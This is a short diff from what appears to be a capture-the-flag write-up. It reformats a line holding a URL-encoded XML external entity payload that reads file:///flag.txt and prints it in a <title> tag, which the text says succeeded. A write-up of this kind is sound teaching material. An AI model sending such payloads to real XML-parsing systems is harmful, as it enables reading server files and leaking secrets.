@@ -129,8 +129,7 @@ The app ignored them since it only reads `<title>` and `<description>`.
 
 This payload successfully printed the content of `file:///flag.txt` inside the `<title>` tag:
 
-<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+data+[++<!ENTITY+xxe+SYSTEM+"file%3a///flag.txt">]>++++<title>%26xxe%3b</title>
-```
+    <%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+data+[++<!ENTITY+xxe+SYSTEM+"file%3a///flag.txt">]>++++<title>%26xxe%3b</title>
 
 Decoded readable XML:
 
